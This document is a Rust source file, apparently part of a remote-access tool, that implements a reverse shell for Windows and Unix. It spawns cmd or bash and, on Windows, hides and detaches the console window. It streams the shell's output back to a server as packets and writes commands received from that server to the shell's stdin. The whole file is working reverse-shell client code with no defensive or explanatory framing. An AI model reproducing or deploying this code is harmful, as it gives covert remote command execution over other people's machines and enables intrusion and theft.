#[cfg(windows)]
mod windows {
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::Child;

    use common::shell::read_console_buffer;
    use common::packets::ServerboundPacket;
    use crate::handler::send_packet;

    pub struct ReverseShell {
        pub reverse_shell: Option<Child>,
    }

    impl ReverseShell {
        pub fn new() -> Self {
            ReverseShell {
                reverse_shell: None,
            }
        }

        pub fn start_shell(&mut self) {
            const DETACH: u32 = 0x00000008;
            const HIDE: u32 = 0x08000000;

            self.reverse_shell = Some(
                std::process::Command
                    ::new("cmd")
                    .creation_flags(HIDE | DETACH)
                    .stdin(std::process::Stdio::piped())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
                    .unwrap()
            );

            if let Some(shell) = self.reverse_shell.as_mut() {
                if let Some(stdout) = shell.stdout.take() {
                    std::thread::spawn(move || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all()
                            .build()
                            .expect("Failed to create Tokio runtime");

                        let mut cmd_output = stdout;
                        let mut cmd_buffer: String = String::new();
                        loop {
                            let read_result = read_console_buffer(&mut cmd_output);
                            match read_result {
                                Ok(vec) => {
                                    cmd_buffer += &String::from_utf8_lossy(&vec);

                                    if String::from_utf8_lossy(&vec).ends_with('>') {
                                        if let Err(e) = rt.block_on(send_packet(ServerboundPacket::ShellOutput(cmd_buffer.to_string()))) {
                                            println!("Failed to send shell output: {}", e);
                                        }
                                        cmd_buffer.clear();
                                    }
                                }
                                Err(_) => {
                                    eprintln!("Error reading from shell stdout or end of file.");
                                    break;
                                }
                            }
                        }
                    });
                }
            }
        }

        pub fn send_shell_command(&mut self, command: &[u8]) {
            if let Some(shell) = self.reverse_shell.as_mut() {
                if let Some(stdin) = shell.stdin.as_mut() {
                    let _ = stdin.write_all(command);
                    let _ = stdin.flush();
                }
            }
        }
    }
}

#[cfg(unix)]
mod unix {
    use std::io::Write;
    use std::process::Child;

    use common::shell::read_console_buffer;
    use common::packets::ServerboundPacket;
    use crate::handler::send_packet;

    pub struct ReverseShell {
        pub reverse_shell: Option<Child>,
    }

    impl Default for ReverseShell {
        fn default() -> Self {
            Self::new()
        }
    }

    impl ReverseShell {
        pub fn new() -> Self {
            ReverseShell {
                reverse_shell: None,
            }
        }

        pub fn start_shell(&mut self) {
            self.reverse_shell = Some(
                std::process::Command
                    ::new("bash")
                    .stdin(std::process::Stdio::piped())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
                    .unwrap()
            );

            if let Some(shell) = self.reverse_shell.as_mut() {
                if let Some(stdout) = shell.stdout.take() {
                    std::thread::spawn(move || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all()
                            .build()
                            .expect("Failed to create Tokio runtime");

                        let mut cmd_output = stdout;
                        let mut cmd_buffer: String = String::new();
                        loop {
                            let read_result = read_console_buffer(&mut cmd_output);
                            match read_result {
                                Ok(vec) => {
                                    cmd_buffer += &String::from_utf8_lossy(&vec);

                                    if String::from_utf8_lossy(&vec).ends_with('$') {
                                        if let Err(e) = rt.block_on(send_packet(ServerboundPacket::ShellOutput(cmd_buffer.to_string()))) {
                                            println!("Failed to send shell output: {}", e);
                                        }
                                        cmd_buffer.clear();
                                    }
                                }
                                Err(_) => {
                                    eprintln!("Error reading from shell stdout or end of file.");
                                    break;
                                }
                            }
                        }
                    });
                }
            }
        }

        pub fn send_shell_command(&mut self, command: &[u8]) {
            if let Some(shell) = self.reverse_shell.as_mut() {
                if let Some(stdin) = shell.stdin.as_mut() {
                    let _ = stdin.write_all(command);
                    let _ = stdin.flush();
                }
            }
        }
    }
}

#[cfg(windows)]
pub use windows::*;

#[cfg(unix)]
pub use unix::*;